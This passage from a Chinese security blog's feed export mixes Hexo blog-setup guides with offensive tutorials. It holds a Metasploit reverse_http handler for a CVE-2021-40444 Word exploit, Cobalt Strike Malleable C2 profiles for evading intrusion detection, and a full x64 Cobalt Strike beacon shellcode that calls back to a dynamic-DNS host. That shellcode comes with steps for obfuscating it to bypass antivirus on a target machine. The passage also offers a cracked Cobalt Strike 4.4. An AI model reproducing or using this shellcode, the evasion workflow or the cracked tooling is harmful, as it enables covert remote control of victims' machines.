</blockquote>
<p><strong>五、msf使用下面命令监听，然后将out/document.docx文件放入目标机中运行就成功上线了</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">handler -x -H 192.168.1.104 -P 8080 -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210916182549483.png" alt="image-20210916182549483"></p>
</blockquote>
<h1 id="临时解决方案"><a href="#临时解决方案" class="headerlink" title="临时解决方案"></a>临时解决方案</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">创建一个reg文件，输入以下内容并且执行</span><br><span class="line"></span><br><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0]</span><br><span class="line">&quot;1001&quot;&#x3D;dword:00000003</span><br><span class="line">&quot;1004&quot;&#x3D;dword:00000003</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1]</span><br><span class="line">&quot;1001&quot;&#x3D;dword:00000003</span><br><span class="line">&quot;1004&quot;&#x3D;dword:00000003</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]</span><br><span class="line">&quot;1001&quot;&#x3D;dword:00000003</span><br><span class="line">&quot;1004&quot;&#x3D;dword:00000003</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3]</span><br><span class="line">&quot;1001&quot;&#x3D;dword:00000003</span><br><span class="line">&quot;1004&quot;&#x3D;dword:00000003</span><br></pre></td></tr></table></figure></div>

<h1 id="explit下载"><a href="#explit下载" class="headerlink" title="explit下载"></a>explit下载</h1><blockquote>
<p><a href="https://github.com/lockedbyte/CVE-2021-40444" target="_blank" rel="noopener">https://github.com/lockedbyte/CVE-2021-40444</a></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>漏洞复现</tag>
        <tag>CVE-2021-40444</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike中Malleable-C2的使用</title>
    <url>/posts/141.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike的基础使用</li>
</ul>
</blockquote>
<h1 id="Malleable-C2"><a href="#Malleable-C2" class="headerlink" title="Malleable C2"></a>Malleable C2</h1><p>简单的说就是beacon中payload的属性、行为、通过框架修改这些配置文件的属性，可以伪造正常的通信的流量，绕过ids入侵检测防火墙。</p>
<h2 id="profiles配置文件的简单介绍"><a href="#profiles配置文件的简单介绍" class="headerlink" title="profiles配置文件的简单介绍"></a>profiles配置文件的简单介绍</h2><blockquote>
<p>jitter 控制beacon的不稳定的抖动时间</p>
<p>maxdns 控制dns的最大访问次数</p>
<p>sleeptime 控制beacon的睡眠间隔时间等还有很多，可以百度</p>
</blockquote>
<p>接着c2lint的是用来检测profiles的文件是否正确</p>
<p>绿色正常，黄色警告，红色是错误</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;Malleable-C2-Profiles</span><br></pre></td></tr></table></figure></div>

<p>检测Malleable中犯罪工具中asp开头的profiles</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;c2lint Malleable-C2-Profiles-master&#x2F;crimeware&#x2F;asprox.profile</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210916220317941.png" alt="image-20210916220317941"></p>
</blockquote>
<p>使用配置文件的方法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver 192.168.43.22 123456 Malleable-C2-Profiles-master&#x2F;crimeware&#x2F;asprox.profile</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210916220340741.png" alt="image-20210916220340741"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike免杀payload</title>
    <url>/posts/139.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike的基础使用</li>
</ul>
</blockquote>
<h1 id="Shellcode混淆免杀"><a href="#Shellcode混淆免杀" class="headerlink" title="Shellcode混淆免杀"></a>Shellcode混淆免杀</h1><blockquote>
<p>在github逛了一波，找到一个8月20多号的shellcode混淆脚本，不知道什么时候会失效，先记录一下使用方法</p>
<p>预备：python3.x，安装依赖的话就用pip就行</p>
<p>下载地址：<a href="https://github.com/iframepm/FuckAV" target="_blank" rel="noopener">https://github.com/iframepm/FuckAV</a></p>
</blockquote>
<p><strong>1、下载好之后，解压</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210912131828488.png" alt=""></p>
</blockquote>
<p><strong>2、CS生成一个python的shellcode，注意要64位的payload</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210912132013491.png" alt=""></p>
</blockquote>
<p><strong>3、接着将其保存起来payload.py，打开之后复制其中的这部分内容</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x70\x33\x4b\x6f\x00\x37\x99\x6d\x09\xe7\x2a\x7d\xfc\x81\x4b\xc6\x64\x31\x32\x4b\x06\x2d\x5c\x81\x42\x58\xc3\x9f\x06\xc4\x29\x85\xe9\x94\xbc\xf2\x73\x28\x49\xef\x8e\x40\x5f\x7c\xce\x1a\x42\x53\xaf\xf2\x97\xb4\x58\x65\xa2\x7e\x51\xc5\x8a\xf4\xc8\x16\xe7\x0e\x9a\x99\xf8\xad\x85\xce\xf6\x35\x7f\xca\x6a\xe1\xc8\x16\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x32\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x2e\x4e\x45\x54\x20\x43\x4c\x52\x20\x32\x2e\x30\x2e\x35\x30\x37\x32\x37\x29\x0d\x0a\x00\x0d\x5b\x89\xf5\x8d\x86\xb8\xc8\x45\x9f\x25\xa1\xc0\xe6\x83\x7d\x23\x5c\x1d\x85\xa7\x12\x21\x41\xf2\x6c\xb5\xd9\x8c\x60\x8e\x9c\x33\x51\xb9\x5d\xd3\xfe\x72\x3a\xd7\x11\xab\x4c\xc4\x07\x4e\x82\xaa\x6c\xf1\x1f\x34\x29\xb6\x03\xf3\x93\xda\x04\x0e\x41\x0d\xb6\x5d\x18\x39\xb7\x2f\xaf\xa0\xb0\x9e\x90\x64\x06\x1a\x61\x43\x7f\xbe\x52\x69\x79\xc2\x92\xca\x4d\xfb\x68\x32\x01\x78\xc7\xce\x0e\x73\x71\x03\xb3\x92\xfd\xc2\x34\x4d\xbe\x25\x0e\x05\xc8\xea\x86\xcb\x7a\x44\x86\x67\x57\x1d\xbb\xc4\x65\x7e\x30\x42\x16\x9b\x12\xd4\xaf\xcc\x8c\xa9\x0d\x3a\x25\x84\xf6\x00\x3e\xb6\xa4\xfa\x07\x44\xc1\xc2\xd4\x68\xe7\xc6\xc2\x35\x93\x8f\x3e\xe2\x10\x44\x10\xba\x6b\xe6\xf1\x13\xce\xe7\xf0\x2f\x2d\x07\x9c\x9f\x25\x49\x2b\x54\x35\x49\xee\x4f\x4f\x45\x29\x48\x12\xd6\x7b\x3f\xe4\x89\xa8\x4a\xfa\xc6\x22\x4e\xaf\x36\x89\x14\x72\x45\xd3\x03\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x61\x64\x33\x39\x34\x30\x32\x33\x34\x35\x2e\x77\x69\x63\x70\x2e\x76\x69\x70\x00\x6f\xaa\x51\xc3</span><br></pre></td></tr></table></figure></div>

<p><strong>4、运行shellcode混淆工具来加密绕过AV</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python3 FuckAV.py</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210912132203036.png" alt=""></p>
</blockquote>
<p><strong>5、输入1，然后填入我们刚刚复制的shellcode，进行6次加密</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210912132310395.png" alt="image-20210912132310395"></p>
</blockquote>
<p>接着我们得到回馈，shellcode在当前目录的hex.txt中</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210912132347782.png" alt="image-20210912132347782"></p>
</blockquote>
<p><strong>6、将其复制到我们的服务器中，看看是否可以打开，发现可以了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210912132609809.png" alt="image-20210912132609809"></p>
</blockquote>
<p>7、接着我们再生成一个shell.exe文件，在目标机子上用这个shell.exe文件执行我们刚刚加密的shellcode文本也就是hex.txt文本，就可以达到绕过AV</p>
<p><strong>①再次执行刚刚的代码，然后选择2，生成一个shell.exe文件</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210912133102134.png" alt="image-20210912133102134"></p>
</blockquote>
<p><strong>②在目标机子上通过这个命令来反弹beacon到cs中，发现火绒没有杀掉，也扫不到</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell http:&#x2F;&#x2F;127.0.0.1&#x2F;hex.txt</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210912133253832.png" alt="image-20210912133253832"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】Hexo中next主题微信引流教程</title>
    <url>/posts/137.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>相信不少伙伴在github中搭建了属于自己的博客，我最近看了其他文章学习到一个姿势，就是微信怎么用博客引流，这时看到了OpenWrite</p>
</blockquote>
<h1 id="一、OpenWrite设置"><a href="#一、OpenWrite设置" class="headerlink" title="一、OpenWrite设置"></a>一、OpenWrite设置</h1><p>1、打开<a href="https://openwrite.cn/进行注册" target="_blank" rel="noopener">https://openwrite.cn/进行注册</a></p>
<p>2、登陆后，选择增长工具</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210911091038973.png" alt="image-20210911091038973"></p>
</blockquote>
<p>3、点击添加，填写自己的微信公众号信息</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210911091102950.png" alt="image-20210911091102950"></p>
</blockquote>
<p>4、接着就得到两个设置的信息</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210911091247707.png" alt="image-20210911091247707"></p>
</blockquote>
<h1 id="二、公众号设置规则自动回复"><a href="#二、公众号设置规则自动回复" class="headerlink" title="二、公众号设置规则自动回复"></a>二、公众号设置规则自动回复</h1><p>填写完成后，点击使用</p>
<p>登录要增粉的微信公众号，按如下规则设置关键词回复</p>
<p>关键词，设置为：<strong>VIP</strong>（之前你自己设置的关键词）</p>
<p>回复内容，设置为如下文本内容：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;readmore.openwrite.cn&#x2F;code&#x2F;generate?blogId&#x3D;23138-1631285680758-213&quot;&gt;点击该链接，获取博客解锁验证码&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure></div>

<p> 然后还有一段 js 代码，将其拷贝出来</p>
<p>三、Next主题配置</p>
<p>1、新增swig文件</p>
<p>在 <code>themes\next\layout\_custom</code> 文件夹中，新建一个 <code>hide.swig</code> 文件，内容如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#123;% if page.comments and theme.page_readmore %&#125;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;readmore.openwrite.cn&#x2F;js&#x2F;readmore.js&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    const btw &#x3D; new BTWPlugin();</span><br><span class="line">    btw.init(&#123;</span><br><span class="line">        id: &#39;container&#39;,</span><br><span class="line">        blogId: &#39;23138-1631285680758-213&#39;,</span><br><span class="line">        name: &#39;渗透安全数据库&#39;,</span><br><span class="line">        qrcode: &#39;https:&#x2F;&#x2F;gylq.gitee.io&#x2F;cloudimages&#x2F;img&#x2F;mmexport1627522419167.jpg&#39;,</span><br><span class="line">        keyword: &#39;vip&#39;,</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中的 js 代码为第二步中生成的 js。</p>
<p>2、修改_layout.swig</p>
<p>修改文件 <code>themes\next\layout\_layout.swig</code> 文件</p>
<p>用查找搜索找到类似如下代码段：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;content-wrap&quot;&gt;</span><br><span class="line">	  &lt;div id&#x3D;&quot;content&quot; class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">		&#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line">	  &lt;&#x2F;div&gt;</span><br><span class="line">  &#123;% include &#39;_third-party&#x2F;duoshuo-hot-articles.swig&#39; %&#125;</span><br><span class="line">  &#123;% include &#39;_partials&#x2F;comments.swig&#39; %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure></div>

<p>修改为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;content-wrap&quot;&gt;</span><br><span class="line">	&lt;div id&#x3D;&quot;container&quot;&gt;</span><br><span class="line">	  &lt;div id&#x3D;&quot;content&quot; class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">		&#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line">	  &lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">  &#123;% include &#39;_third-party&#x2F;duoshuo-hot-articles.swig&#39; %&#125;</span><br><span class="line">  &#123;% include &#39;_partials&#x2F;comments.swig&#39; %&#125;</span><br><span class="line">  &#123;% include &#39;_custom&#x2F;hide.swig&#39; %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure></div>

<p>3、修改主题配置文件</p>
<p>新增是否添加<strong>阅读全文</strong>的开关</p>
<p>在文件 <code>themes\next\_config.yml</code> 中新增：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># 是否开启阅读全文</span><br><span class="line">page_readmore: true</span><br></pre></td></tr></table></figure></div>

<p>此配置可以用于快捷配置开关。</p>
<p>4、重新生成静态文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure></div>

<p>就完成引流了。</p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>知识积累</tag>
      </tags>
  </entry>
  <entry>
    <title>【HEXO】我的主题自动化搭建和说明（懒人资源）</title>
    <url>/posts/136.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p><strong>当然，这只是简陋的说明一下关于我给大家的主题（theme）怎么使用的方法，具体很多细节，需要大家自己去修改，也许会有许多坑，相信大家一定可以自己填满</strong></p>
<p>一点都不会的话，建议去看看这篇文章试着<strong><a href="https://gylq.gitee.io/2020/07/01/hexo%E5%8D%9A%E5%AE%A2/">搭建一个博客再来说</a></strong></p>
</blockquote>
<h1 id="主题使用"><a href="#主题使用" class="headerlink" title="主题使用"></a>主题使用</h1><p><strong>1、我给大家打压缩包（在文章的最底部有下载链接，我也会想办法上传到github供师傅们使用）</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210911000354752.png" alt="image-20210911000354752"></p>
</blockquote>
<p><strong>2、解压完毕之后是这样的</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210911000442711.png" alt="image-20210911000442711"></p>
</blockquote>
<p>3、从此处打开Git Bash，这里可以查看一下是否能够运行，正常情况下什么都不修改是可以运行成功的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hexo s -g</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210911001543385.png" alt="image-20210911001543385"></p>
</blockquote>
<p>接着访问<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210911010102076.png" alt="image-20210911010102076"></p>
</blockquote>
<p>上面是可以正常回显和访问的。</p>
<p><strong>4、由于我发给你们的是我自己的邮箱和用户名，所以你们得修改一下，不然上传不到自己的仓库</strong></p>
<p>①查看当前账户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ git config --global --list</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210911001102507.png" alt="image-20210911001102507"></p>
</blockquote>
<p>②修改为自己的账户</p>
<p><code>git config user.name</code>：查看用户名<br><code>git config user.email</code>：查看邮箱<br><code>git config user.name</code> “你的用户名”：修改你本地一个仓库的用户名<br><code>git config user.email</code>“你的邮箱”：修改你本地一个仓库的邮箱<br><code>git config --global user.name</code>“你的用户名”：修改全局仓库的用户名<br><code>git config --global user.email</code>“你的邮箱”：修改全局仓库的邮箱</p>
<p><strong>5、修改上传仓库，不管是github或者gitee上的代码托管仓库都行</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210911001316807.png" alt="image-20210911001316807"></p>
</blockquote>
<p>6、资源下载方式</p>
<blockquote>
<p>注意：我自己可以很正常的使用，大家如果有什么大问题可以留言或者加我来询问问题。</p>
</blockquote>
<p>GITHUB：<a href="https://github.com/GYLQ/theme-gylq" target="_blank" rel="noopener">https://github.com/GYLQ/theme-gylq</a></p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>知识积累</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控工具】Cobalt Strike 4.4破解版</title>
    <url>/posts/133.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Cobalt-Strike-4-4更新日志"><a href="#Cobalt-Strike-4-4更新日志" class="headerlink" title="Cobalt Strike 4.4更新日志"></a>Cobalt Strike 4.4更新日志</h2><p>cobalt strike4.4于2021 年 8 月 4 日发布</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-6.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-6.webp" alt="cobalt strike4.4破解版下载|cs4.4|cobalt strike4.4 cracked"></a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">-------------</span><br><span class="line">+ 添加对用户定义反射加载器的支持。</span><br><span class="line">  https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;help-user-defined-reflective-loader</span><br><span class="line">+ 添加对用户定义睡眠屏蔽的支持。</span><br><span class="line">  https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;help-sleep-mask-kit</span><br><span class="line">+ 产品许可和安全增强。</span><br><span class="line">+ 避免使用 localhost Sysmon 事件 22 进行 Beacon 元数据解析。</span><br><span class="line">+ 使用 sleep_mask 集验证信标是否有足够的代码洞空间。</span><br><span class="line">+ 更新 Mimikatz (2.2.0 20210724)</span><br><span class="line">+ 使用证书&#x2F;子域信息更新 Cobalt Strike 更新程序</span><br><span class="line">+ 添加客户端重连选项</span><br><span class="line">+ 通过 NanoHTTPD 发送数据时添加缓冲</span><br><span class="line">+ 更新链接命令的信标帮助</span><br><span class="line">+ 更新 c2lint 以返回结果代码</span><br><span class="line">+ 向 UI 添加新对话框以查看 Malleable C2 配置文件</span><br><span class="line">+ 为用户代理过滤器添加“允许”选项；补充了 4.3 中添加的块</span><br><span class="line">+ 为服务器添加别名字段到登录对话框</span><br><span class="line">+ 为连接对话框添加别名</span><br><span class="line">+ 在 Cobalt Strike 主屏幕上的连接选项卡上添加别名</span><br><span class="line">+ 增强编码签名功能的 c2lint 和 UI 处理</span><br><span class="line">+ 增强故障转移主机轮换策略（http&#x2F;s 200 响应无效数据为失败）</span><br><span class="line">+ 添加鱼叉式网络钓鱼电子邮件模板解析验证以发送客户端操作</span><br><span class="line">+ UI：连接对话框的增强请求以记住上次连接的团队服务器</span><br><span class="line">+ 为代码签名配置添加更好的 C2 linting</span><br><span class="line">+ 使用编译的 Artifact 套件构建信标时校验和失败</span><br><span class="line">+ 漏洞报告：团队服务器被过大截图轰炸时崩溃。（添加 TeamServer.prop 配置）</span><br><span class="line">+ 修复武器库构建脚本中的错误（添加 bin&#x2F;bash 指令）</span><br><span class="line">+ 修复 UI 中未编辑所需表格行选择的各个位置。</span><br><span class="line">+ 修复当侦听器的主机条目末尾包含空格时的信标错误（修剪主机条目字符串）</span><br><span class="line">+ 